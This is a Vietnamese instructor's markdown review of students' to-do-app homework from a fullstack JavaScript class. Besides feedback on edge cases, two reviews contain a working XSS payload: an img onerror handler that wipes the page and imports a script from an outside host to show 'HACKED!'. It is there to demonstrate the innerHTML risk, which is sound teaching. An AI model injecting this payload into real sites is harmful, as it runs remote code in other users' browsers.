# Quân review bài học viên lớp K3-Fullstack

## [Nguyễn Quang Cường](https://github.com/cuonggold2408/Fullxinach_K3/tree/main/Day_24)

- [x] [Bài 1]

  Bài làm rất tốt\*

  Thẻ input khi chỉnh sửa nên thay đổi `placeholder` ví dụ như là `Edit Task` thì sẽ hợp lý hơn.

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà: Bài tập làm rất tốt.

---

## [Phí Văn Đức](https://github.com/PhiVanDuc/Offline-F8-K3/tree/main/Day-24-JS)

- [x] [Bài 1]

  Bài làm tốt\*

  Bài làm chưa xử lý case nhập toàn khoảng trắng.

  Bài làm chưa xử lý case khi nhấn vào task để hoàn thành task thì khi nhấn sửa và update task vẫn phải trong trạng thái hoàn thành trước đó nhưng hiện tại ở bài làm khi sửa lại thì task lại quay về trạng thái chưa hoàn thành.

  Khi cập nhật task nếu người dùng xóa hết nội dung và submit không nên hiện là `undefined` mà cần thông báo cho người dùng cần nhập nội dung mới cho update vì nếu mục đích muốn xóa task thì user sẽ nhấn vào icon xóa để xóa chứ không để trống nội dung task.

  Nên tách riêng ra từng function ở ngoài thực hiện từng chức năng riêng biệt giúp cho code dễ hiểu và dễ sửa đổi hơn sau này.

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  "/><img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà: Bài tập làm tốt, tuy nhiên chưa xét hết tất cả các case.

---

## [Đỗ Văn Khoa](https://mrkhoadev.github.io/F8-Fullstack-K3/)

- [x] [Bài 1]

  Bài làm tốt\*

  Bài làm chưa xử lý case khi nhấn vào task để hoàn thành task thì khi nhấn sửa và update task vẫn phải trong trạng thái hoàn thành trước đó nhưng hiện tại ở bài làm khi sửa lại thì task lại quay về trạng thái chưa hoàn thành.

  Khi cập nhật task nếu người dùng xóa hết nội dung và submit không nên hiện task trống mà cần thông báo cho người dùng cần nhập nội dung mới cho update vì nếu mục đích muốn xóa task thì user sẽ nhấn vào icon xóa để xóa chứ không để trống nội dung task.

- [x] Đánh giá chung bài tập về nhà: Bài tập làm tốt, tuy nhiên còn một số case chưa hoàn thiện tốt.

---
